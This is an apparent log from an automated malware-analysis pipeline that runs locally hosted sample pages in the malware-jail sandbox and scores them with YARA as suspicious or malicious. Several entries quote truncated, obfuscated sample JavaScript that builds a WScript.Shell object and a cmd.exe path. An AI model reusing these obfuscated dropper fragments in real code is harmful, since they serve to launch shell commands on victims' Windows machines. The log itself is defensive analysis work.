+[18/05 18:42:41][info]Process at 29815 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0040_A6FDBFAE/results]
+[18/05 18:42:41][info]A6FDBFAE,/malware/localhost_05-18_18-42-0040_A6FDBFAE/results/ <all files> ,60,Suspicious
+[18/05 18:42:41][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:41][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:41][info][2EB5483A]Injecting Transaction Monitor
+[18/05 18:42:41][info](2EB5483A)Starting job http://localhost/malware_samples/882f77897bba85afdc56810c29ef4cbb.html
+[18/05 18:42:41][info](2EB5483A)Last page Navigated to http://localhost/malware_samples/882f77897bba85afdc56810c29ef4cbb.html status: 200 OK date: Sat, 18 May 2019 15:42:41 GMT
+[18/05 18:42:41][info]Found frames: 0
+[18/05 18:42:41][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0041_2EB5483A/localhost_18-42-0041.js
+[18/05 18:42:41][info]Processing command for NodeJS in folder localhost_05-18_18-42-0041_2EB5483A and file localhost_18-42-0041.js
+[18/05 18:42:41][info]Process at 29849 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0041_2EB5483A.json ./malware/localhost_05-18_18-42-0041_2EB5483A/localhost_18-42-0041.js]
+[18/05 18:42:42][warning]Uncaught Exception occured, scanning results might be innacurate: 
+18 May 18:42:42 - mailware-jail, a malware sandbox ver. 0.19
+18 May 18:42:42 - ------------------------
+18 May 18:42:42 - Arguments: --h404 -t 15000 -c ./config_localhost_05-18_18-42-0041_2EB5483A.json ./malware/localhost_05-18_18-42-0041_2EB5483A/localhost_18-42-0041.js
+18 May 18:42:42 - Sandbox environment sequence: malware-jail/env/utils.js,malware-jail/env/eval.js,malware-jail/env/function.js,malware-jail/env/wscript.js,malware-jail/env/browser.js,malware-jail/env/agents.js,malware-jail/env/other.js,malware-jail/env/console.js
+18 May 18:42:42 - Malware files: ./malware/localhost_05-18_18-42-0041_2EB5483A/localhost_18-42-0041.js
+18 May 18:42:42 - Execution timeout set to: 15 seconds
+18 May 18:42:42 - Output file for sandbox dump: malware-jail/sandbox_dump_after.json
+18 May 18:42:42 - Output directory for generated files: malware-jail/../malware/localhost_05-18_18-42-0041_2EB5483A/output/
+18 May 18:42:42 - Download from remote server: Return HTTP/404
+18 May 18:42:42 - ==> Preparing Sandbox environment.
+18 May 18:42:42 -  => Executing: malware-jail/env/utils.js quitely
+18 May 18:42:42 -  => Executing: malware-jail/env/eval.js quitely
+18 May 18:42:42 -  => Executing: malware-jail/env/function.js quitely
+18 May 18:42:42 -  => Executing: malware-jail/env/wscript.js quitely
+18 May 18:42:42 -  => Executing: malware-jail/env/browser.js quitely
+18 May 18:42:42 -  => Executing: malware-jail/env/agents.js quitely
+18 May 18:42:42 -  => Executing: malware-jail/env/other.js quitely
+18 May 18:42:42 -  => Executing: malware-jail/env/console.js quitely
+18 May 18:42:42 - ==> Executing malware file(s). =========================================
+18 May 18:42:42 -  => Executing: ./malware/localhost_05-18_18-42-0041_2EB5483A/localhost_18-42-0041.js verbosely, reporting silent catches
+18 May 18:42:42 - Saving: malware-jail/../malware/localhost_05-18_18-42-0041_2EB5483A/output/._malware_localhost_05-18_18-42-0041_2EB5483A_localhost_18-42-0041.js
+18 May 18:42:42 - Saving: malware-jail/../malware/localhost_05-18_18-42-0041_2EB5483A/output/tr_._malware_localhost_05-18_18-42-0041_2EB5483A_localhost_18-42-0041.js
+18 May 18:42:42 - WScript.scriptfullname = (string) './malware/localhost_05-18_18-42-0041_2EB5483A/localhost_18-42-0041.js'
+18 May 18:42:42 - WScript.arguments = (object) './malware/localhost_05-18_18-42-0041_2EB5483A/localhost_18-42-0041.js,xyz'
+18 May 18:42:42 - Calling eval[1]('function e(){?    var _hsiyudgfustdg = "WS"+""+"c"+"r"+"i"+"pt";?    var _c = "\%Sy"+"st"+""+"em"+"Root\%\\s"+"ystem32\\cmd."+"ex"+"e";?     var _87867t67t6gt = this[_hsiyudgfustdg]["Cre"+"ateOb"+"ject"](_hsiyudgfustdg+".She"+"ll"); ?    var _87g6sd5 ... (truncated)')
+18 May 18:42:42 - WScript.CreateObject(WScript.Shell)
+18 May 18:42:42 - new WScript.Shell[14]
+18 May 18:42:42 - new WshEnvironment[15](SYSTEM)
+18 May 18:42:42 - WScript.Shell[14].Environment(SYSTEM)
+18 May 18:42:42 - WshEnvironment[15](SYSTEM)(COMSPEC) => C:\WINDOWS\system32\cmd.exe
+18 May 18:42:42 - Exception occured: object undefined:8
+	else {this[this["_hsiyudgfustdg"]]["Qui"+""+"t"](1);};
+	                                  ^
+
+TypeError: Cannot read property 'Quit' of undefined
+    at e (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:8:36)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:10:1)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at ./malware/localhost_05-18_18-42-0041_2EB5483A/localhost_18-42-0041.js:17:1
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+    at Object.<anonymous> (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:360:20)
+18 May 18:42:42 - ==> Cleaning up sandbox.
+18 May 18:42:42 - ==> Script execution finished, dumping sandbox environment to a file.
+18 May 18:42:42 - The sandbox context has been  saved to: malware-jail/sandbox_dump_after.json
+18 May 18:42:42 - Saving: malware-jail/../malware/localhost_05-18_18-42-0041_2EB5483A/output/eval_1.js
+
+[18/05 18:42:42][info]Exporting results to: /results/localhost_18-42-0041.dynamic.log
+[18/05 18:42:42][info]Exporting results to: /results/localhost_18-42-0041.static.log
+[18/05 18:42:42][info]No Dynamic URLs extracted from: localhost_05-18_18-42-0041_2EB5483A/localhost_18-42-0041.js
+[18/05 18:42:42][info]Initializing YARA localhost_05-18_18-42-0041_2EB5483A/results/ <all files>
+[18/05 18:42:42][info]Process at 29865 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0041_2EB5483A/results]
+[18/05 18:42:42][info]2EB5483A,/malware/localhost_05-18_18-42-0041_2EB5483A/results/ <all files> ,60,Suspicious
+[18/05 18:42:42][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:42][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:42][info][C055CF97]Injecting Transaction Monitor
+[18/05 18:42:42][info](C055CF97)Starting job http://localhost/malware_samples/f390a189475e86d7a0b2846d915b9af1.html
+[18/05 18:42:42][info](C055CF97)Last page Navigated to http://localhost/malware_samples/f390a189475e86d7a0b2846d915b9af1.html status: 200 OK date: Sat, 18 May 2019 15:42:42 GMT
+[18/05 18:42:42][info]Found frames: 0
+[18/05 18:42:42][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0042_C055CF97/localhost_18-42-0042.js
+[18/05 18:42:42][info]Processing command for NodeJS in folder localhost_05-18_18-42-0042_C055CF97 and file localhost_18-42-0042.js
+[18/05 18:42:42][info]Process at 29899 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0042_C055CF97.json ./malware/localhost_05-18_18-42-0042_C055CF97/localhost_18-42-0042.js]
+[18/05 18:42:43][info]Exporting results to: /results/localhost_18-42-0042.dynamic.log
+[18/05 18:42:43][info]Exporting results to: /results/localhost_18-42-0042.static.log
+[18/05 18:42:43][info]Dynamic URLs extracted from localhost_05-18_18-42-0042_C055CF97/localhost_18-42-0042.js and saved to ./malware/localhost_05-18_18-42-0042_C055CF97/output/urls.json
+[18/05 18:42:43][info]Initializing YARA localhost_05-18_18-42-0042_C055CF97/results/ <all files>
+[18/05 18:42:43][info]Process at 29915 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0042_C055CF97/results]
+[18/05 18:42:43][info]C055CF97,/malware/localhost_05-18_18-42-0042_C055CF97/results/ <all files> ,80,Malicious
+[18/05 18:42:43][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:43][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:43][info][5435D525]Injecting Transaction Monitor
+[18/05 18:42:43][info](5435D525)Starting job http://localhost/malware_samples/c54d3f25ff9982fc963af63a98aa90bb.html
+[18/05 18:42:43][info](5435D525)Last page Navigated to http://localhost/malware_samples/c54d3f25ff9982fc963af63a98aa90bb.html status: 200 OK date: Sat, 18 May 2019 15:42:43 GMT
+[18/05 18:42:43][info]Found frames: 0
+[18/05 18:42:43][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0043_5435D525/localhost_18-42-0043.js
+[18/05 18:42:43][info]Processing command for NodeJS in folder localhost_05-18_18-42-0043_5435D525 and file localhost_18-42-0043.js
+[18/05 18:42:43][info]Process at 29949 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0043_5435D525.json ./malware/localhost_05-18_18-42-0043_5435D525/localhost_18-42-0043.js]
+[18/05 18:42:43][info]Exporting results to: /results/localhost_18-42-0043.dynamic.log
+[18/05 18:42:43][info]Exporting results to: /results/localhost_18-42-0043.static.log
+[18/05 18:42:43][info]Dynamic URLs extracted from localhost_05-18_18-42-0043_5435D525/localhost_18-42-0043.js and saved to ./malware/localhost_05-18_18-42-0043_5435D525/output/urls.json
+[18/05 18:42:43][info]Initializing YARA localhost_05-18_18-42-0043_5435D525/results/ <all files>
+[18/05 18:42:43][info]Process at 29965 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0043_5435D525/results]
+[18/05 18:42:43][info]5435D525,/malware/localhost_05-18_18-42-0043_5435D525/results/ <all files> ,90,Malicious
+[18/05 18:42:43][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:43][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:43][info][CB7395D3]Injecting Transaction Monitor
+[18/05 18:42:43][info](CB7395D3)Starting job http://localhost/malware_samples/821fdc80f8953394a8ddc44681cdfd3b.html
+[18/05 18:42:43][info](CB7395D3)Last page Navigated to http://localhost/malware_samples/821fdc80f8953394a8ddc44681cdfd3b.html status: 200 OK date: Sat, 18 May 2019 15:42:43 GMT
+[18/05 18:42:43][info]Found frames: 0
+[18/05 18:42:43][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0043_CB7395D3/localhost_18-42-0043.js
+[18/05 18:42:43][info]Processing command for NodeJS in folder localhost_05-18_18-42-0043_CB7395D3 and file localhost_18-42-0043.js
+[18/05 18:42:43][info]Process at 29999 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0043_CB7395D3.json ./malware/localhost_05-18_18-42-0043_CB7395D3/localhost_18-42-0043.js]
+[18/05 18:42:44][info]Exporting results to: /results/localhost_18-42-0043.dynamic.log
+[18/05 18:42:44][info]Exporting results to: /results/localhost_18-42-0043.static.log
+[18/05 18:42:44][info]Dynamic URLs extracted from localhost_05-18_18-42-0043_CB7395D3/localhost_18-42-0043.js and saved to ./malware/localhost_05-18_18-42-0043_CB7395D3/output/urls.json
+[18/05 18:42:44][info]Initializing YARA localhost_05-18_18-42-0043_CB7395D3/results/ <all files>
+[18/05 18:42:44][info]Process at 30015 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0043_CB7395D3/results]
+[18/05 18:42:44][info]CB7395D3,/malware/localhost_05-18_18-42-0043_CB7395D3/results/ <all files> ,90,Malicious
+[18/05 18:42:44][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:44][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:44][info][E025D7EA]Injecting Transaction Monitor
+[18/05 18:42:44][info](E025D7EA)Starting job http://localhost/malware_samples/71c9b59516147ffd6a887e8a285907da.html
+[18/05 18:42:44][info](E025D7EA)Last page Navigated to http://localhost/malware_samples/71c9b59516147ffd6a887e8a285907da.html status: 200 OK date: Sat, 18 May 2019 15:42:44 GMT
+[18/05 18:42:44][info]Found frames: 0
+[18/05 18:42:44][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0044_E025D7EA/localhost_18-42-0044.js
+[18/05 18:42:44][info]Processing command for NodeJS in folder localhost_05-18_18-42-0044_E025D7EA and file localhost_18-42-0044.js
+[18/05 18:42:44][info]Process at 30049 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0044_E025D7EA.json ./malware/localhost_05-18_18-42-0044_E025D7EA/localhost_18-42-0044.js]
+[18/05 18:42:45][warning]Uncaught Exception occured, scanning results might be innacurate: 
+18 May 18:42:44 - mailware-jail, a malware sandbox ver. 0.19
+18 May 18:42:44 - ------------------------
+18 May 18:42:44 - Arguments: --h404 -t 15000 -c ./config_localhost_05-18_18-42-0044_E025D7EA.json ./malware/localhost_05-18_18-42-0044_E025D7EA/localhost_18-42-0044.js
+18 May 18:42:44 - Sandbox environment sequence: malware-jail/env/utils.js,malware-jail/env/eval.js,malware-jail/env/function.js,malware-jail/env/wscript.js,malware-jail/env/browser.js,malware-jail/env/agents.js,malware-jail/env/other.js,malware-jail/env/console.js
+18 May 18:42:44 - Malware files: ./malware/localhost_05-18_18-42-0044_E025D7EA/localhost_18-42-0044.js
+18 May 18:42:44 - Execution timeout set to: 15 seconds
+18 May 18:42:44 - Output file for sandbox dump: malware-jail/sandbox_dump_after.json
+18 May 18:42:44 - Output directory for generated files: malware-jail/../malware/localhost_05-18_18-42-0044_E025D7EA/output/
+18 May 18:42:44 - Download from remote server: Return HTTP/404
+18 May 18:42:44 - ==> Preparing Sandbox environment.
+18 May 18:42:44 -  => Executing: malware-jail/env/utils.js quitely
+18 May 18:42:44 -  => Executing: malware-jail/env/eval.js quitely
+18 May 18:42:44 -  => Executing: malware-jail/env/function.js quitely
+18 May 18:42:44 -  => Executing: malware-jail/env/wscript.js quitely
+18 May 18:42:44 -  => Executing: malware-jail/env/browser.js quitely
+18 May 18:42:44 -  => Executing: malware-jail/env/agents.js quitely
+18 May 18:42:44 -  => Executing: malware-jail/env/other.js quitely
+18 May 18:42:44 -  => Executing: malware-jail/env/console.js quitely
+18 May 18:42:44 - ==> Executing malware file(s). =========================================
+18 May 18:42:44 -  => Executing: ./malware/localhost_05-18_18-42-0044_E025D7EA/localhost_18-42-0044.js verbosely, reporting silent catches
+18 May 18:42:44 - Saving: malware-jail/../malware/localhost_05-18_18-42-0044_E025D7EA/output/._malware_localhost_05-18_18-42-0044_E025D7EA_localhost_18-42-0044.js
+18 May 18:42:44 - Saving: malware-jail/../malware/localhost_05-18_18-42-0044_E025D7EA/output/tr_._malware_localhost_05-18_18-42-0044_E025D7EA_localhost_18-42-0044.js
+18 May 18:42:44 - WScript.scriptfullname = (string) './malware/localhost_05-18_18-42-0044_E025D7EA/localhost_18-42-0044.js'
+18 May 18:42:44 - WScript.arguments = (object) './malware/localhost_05-18_18-42-0044_E025D7EA/localhost_18-42-0044.js,xyz'
+18 May 18:42:45 - Calling eval[1]('function e(){?    var _hsiyudgfustdg = "WS"+""+"c"+"r"+"i"+"pt";?    var _c = "\%Sy"+"st"+""+"em"+"Root\%\\s"+"ystem32\\cmd."+"ex"+"e";?     var _87867t67t6gt = this[_hsiyudgfustdg]["Cre"+"ateOb"+"ject"](_hsiyudgfustdg+".She"+"ll"); ?    var _87g6sd5 ... (truncated)')
+18 May 18:42:45 - WScript.CreateObject(WScript.Shell)
+18 May 18:42:45 - new WScript.Shell[14]
+18 May 18:42:45 - new WshEnvironment[15](SYSTEM)
+18 May 18:42:45 - WScript.Shell[14].Environment(SYSTEM)
+18 May 18:42:45 - WshEnvironment[15](SYSTEM)(COMSPEC) => C:\WINDOWS\system32\cmd.exe
+18 May 18:42:45 - Exception occured: object undefined:8
+	else {this[this["_hsiyudgfustdg"]]["Qui"+""+"t"](1);};
+	                                  ^
+
+TypeError: Cannot read property 'Quit' of undefined
+    at e (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:8:36)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:10:1)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at ./malware/localhost_05-18_18-42-0044_E025D7EA/localhost_18-42-0044.js:16:1
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+    at Object.<anonymous> (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:360:20)
+18 May 18:42:45 - ==> Cleaning up sandbox.
+18 May 18:42:45 - ==> Script execution finished, dumping sandbox environment to a file.
+18 May 18:42:45 - The sandbox context has been  saved to: malware-jail/sandbox_dump_after.json
+18 May 18:42:45 - Saving: malware-jail/../malware/localhost_05-18_18-42-0044_E025D7EA/output/eval_1.js
+
+[18/05 18:42:45][info]Exporting results to: /results/localhost_18-42-0044.dynamic.log
+[18/05 18:42:45][info]Exporting results to: /results/localhost_18-42-0044.static.log
+[18/05 18:42:45][info]No Dynamic URLs extracted from: localhost_05-18_18-42-0044_E025D7EA/localhost_18-42-0044.js
+[18/05 18:42:45][info]Initializing YARA localhost_05-18_18-42-0044_E025D7EA/results/ <all files>
+[18/05 18:42:45][info]Process at 30065 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0044_E025D7EA/results]
+[18/05 18:42:45][info]E025D7EA,/malware/localhost_05-18_18-42-0044_E025D7EA/results/ <all files> ,60,Suspicious
+[18/05 18:42:45][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:45][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:45][info][EF64C859]Injecting Transaction Monitor
+[18/05 18:42:45][info](EF64C859)Starting job http://localhost/malware_samples/98c05098073cc62613100b5b94214b1a.html
+[18/05 18:42:45][info](EF64C859)Last page Navigated to http://localhost/malware_samples/98c05098073cc62613100b5b94214b1a.html status: 200 OK date: Sat, 18 May 2019 15:42:45 GMT
+[18/05 18:42:45][info]Found frames: 0
+[18/05 18:42:45][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0045_EF64C859/localhost_18-42-0045.js
+[18/05 18:42:45][info]Processing command for NodeJS in folder localhost_05-18_18-42-0045_EF64C859 and file localhost_18-42-0045.js
+[18/05 18:42:45][info]Process at 30099 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0045_EF64C859.json ./malware/localhost_05-18_18-42-0045_EF64C859/localhost_18-42-0045.js]
+[18/05 18:42:45][info]Exporting results to: /results/localhost_18-42-0045.dynamic.log
+[18/05 18:42:45][info]Exporting results to: /results/localhost_18-42-0045.static.log
+[18/05 18:42:45][info]Dynamic URLs extracted from localhost_05-18_18-42-0045_EF64C859/localhost_18-42-0045.js and saved to ./malware/localhost_05-18_18-42-0045_EF64C859/output/urls.json
+[18/05 18:42:45][info]Initializing YARA localhost_05-18_18-42-0045_EF64C859/results/ <all files>
+[18/05 18:42:45][info]Process at 30117 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0045_EF64C859/results]
+[18/05 18:42:45][info]EF64C859,/malware/localhost_05-18_18-42-0045_EF64C859/results/ <all files> ,80,Malicious
+[18/05 18:42:45][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:45][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:45][info][8E9C6E43]Injecting Transaction Monitor
+[18/05 18:42:45][info](8E9C6E43)Starting job http://localhost/malware_samples/fe861d35e97a11b6df1a2aedc37cb8dd.html
+[18/05 18:42:45][info](8E9C6E43)Last page Navigated to http://localhost/malware_samples/fe861d35e97a11b6df1a2aedc37cb8dd.html status: 200 OK date: Sat, 18 May 2019 15:42:45 GMT
+[18/05 18:42:45][info]Found frames: 0
+[18/05 18:42:45][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0045_8E9C6E43/localhost_18-42-0045.js
+[18/05 18:42:45][info]Processing command for NodeJS in folder localhost_05-18_18-42-0045_8E9C6E43 and file localhost_18-42-0045.js
+[18/05 18:42:45][info]Process at 30151 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0045_8E9C6E43.json ./malware/localhost_05-18_18-42-0045_8E9C6E43/localhost_18-42-0045.js]
+[18/05 18:42:46][info]Exporting results to: /results/localhost_18-42-0045.dynamic.log
+[18/05 18:42:46][info]Exporting results to: /results/localhost_18-42-0045.static.log
+[18/05 18:42:46][info]Dynamic URLs extracted from localhost_05-18_18-42-0045_8E9C6E43/localhost_18-42-0045.js and saved to ./malware/localhost_05-18_18-42-0045_8E9C6E43/output/urls.json
+[18/05 18:42:46][info]Initializing YARA localhost_05-18_18-42-0045_8E9C6E43/results/ <all files>
+[18/05 18:42:46][info]Process at 30167 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0045_8E9C6E43/results]
+[18/05 18:42:46][info]8E9C6E43,/malware/localhost_05-18_18-42-0045_8E9C6E43/results/ <all files> ,80,Malicious
+[18/05 18:42:46][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:46][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:46][info][80C851D1]Injecting Transaction Monitor
+[18/05 18:42:46][info](80C851D1)Starting job http://localhost/malware_samples/87c9d864fafc4420a1bcd3a4ee655964.html
+[18/05 18:42:46][info](80C851D1)Last page Navigated to http://localhost/malware_samples/87c9d864fafc4420a1bcd3a4ee655964.html status: 200 OK date: Sat, 18 May 2019 15:42:46 GMT
+[18/05 18:42:46][info]Found frames: 0
+[18/05 18:42:46][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0046_80C851D1/localhost_18-42-0046.js
+[18/05 18:42:46][info]Processing command for NodeJS in folder localhost_05-18_18-42-0046_80C851D1 and file localhost_18-42-0046.js
+[18/05 18:42:46][info]Process at 30201 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0046_80C851D1.json ./malware/localhost_05-18_18-42-0046_80C851D1/localhost_18-42-0046.js]
+[18/05 18:42:46][warning]Uncaught Exception occured, scanning results might be innacurate: 
+18 May 18:42:46 - mailware-jail, a malware sandbox ver. 0.19
+18 May 18:42:46 - ------------------------
+18 May 18:42:46 - Arguments: --h404 -t 15000 -c ./config_localhost_05-18_18-42-0046_80C851D1.json ./malware/localhost_05-18_18-42-0046_80C851D1/localhost_18-42-0046.js
+18 May 18:42:46 - Sandbox environment sequence: malware-jail/env/utils.js,malware-jail/env/eval.js,malware-jail/env/function.js,malware-jail/env/wscript.js,malware-jail/env/browser.js,malware-jail/env/agents.js,malware-jail/env/other.js,malware-jail/env/console.js
+18 May 18:42:46 - Malware files: ./malware/localhost_05-18_18-42-0046_80C851D1/localhost_18-42-0046.js
+18 May 18:42:46 - Execution timeout set to: 15 seconds
+18 May 18:42:46 - Output file for sandbox dump: malware-jail/sandbox_dump_after.json
+18 May 18:42:46 - Output directory for generated files: malware-jail/../malware/localhost_05-18_18-42-0046_80C851D1/output/
+18 May 18:42:46 - Download from remote server: Return HTTP/404
+18 May 18:42:46 - ==> Preparing Sandbox environment.
+18 May 18:42:46 -  => Executing: malware-jail/env/utils.js quitely
+18 May 18:42:46 -  => Executing: malware-jail/env/eval.js quitely
+18 May 18:42:46 -  => Executing: malware-jail/env/function.js quitely
+18 May 18:42:46 -  => Executing: malware-jail/env/wscript.js quitely
+18 May 18:42:46 -  => Executing: malware-jail/env/browser.js quitely
+18 May 18:42:46 -  => Executing: malware-jail/env/agents.js quitely
+18 May 18:42:46 -  => Executing: malware-jail/env/other.js quitely
+18 May 18:42:46 -  => Executing: malware-jail/env/console.js quitely
+18 May 18:42:46 - ==> Executing malware file(s). =========================================
+18 May 18:42:46 -  => Executing: ./malware/localhost_05-18_18-42-0046_80C851D1/localhost_18-42-0046.js verbosely, reporting silent catches
+18 May 18:42:46 - Saving: malware-jail/../malware/localhost_05-18_18-42-0046_80C851D1/output/._malware_localhost_05-18_18-42-0046_80C851D1_localhost_18-42-0046.js
+18 May 18:42:46 - Saving: malware-jail/../malware/localhost_05-18_18-42-0046_80C851D1/output/tr_._malware_localhost_05-18_18-42-0046_80C851D1_localhost_18-42-0046.js
+18 May 18:42:46 - WScript.scriptfullname = (string) './malware/localhost_05-18_18-42-0046_80C851D1/localhost_18-42-0046.js'
+18 May 18:42:46 - WScript.arguments = (object) './malware/localhost_05-18_18-42-0046_80C851D1/localhost_18-42-0046.js,xyz'
+18 May 18:42:46 - Exception occured: object ./malware/localhost_05-18_18-42-0046_80C851D1/localhost_18-42-0046.js:4
+'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+SyntaxError: Unexpected token (
+    at createScript (vm.js:80:10)
+    at Object.runInContext (vm.js:119:10)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+    at Object.<anonymous> (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:360:20)
+    at Module._compile (module.js:652:30)
+    at Object.Module._extensions..js (module.js:663:10)
+    at Module.load (module.js:565:32)
+    at tryModuleLoad (module.js:505:12)
+    at Function.Module._load (module.js:497:3)
+    at Function.Module.runMain (module.js:693:10)
+18 May 18:42:46 - ==> Cleaning up sandbox.
+18 May 18:42:46 - ==> Script execution finished, dumping sandbox environment to a file.
+18 May 18:42:46 - The sandbox context has been  saved to: malware-jail/sandbox_dump_after.json
+
+[18/05 18:42:46][info]Exporting results to: /results/localhost_18-42-0046.dynamic.log
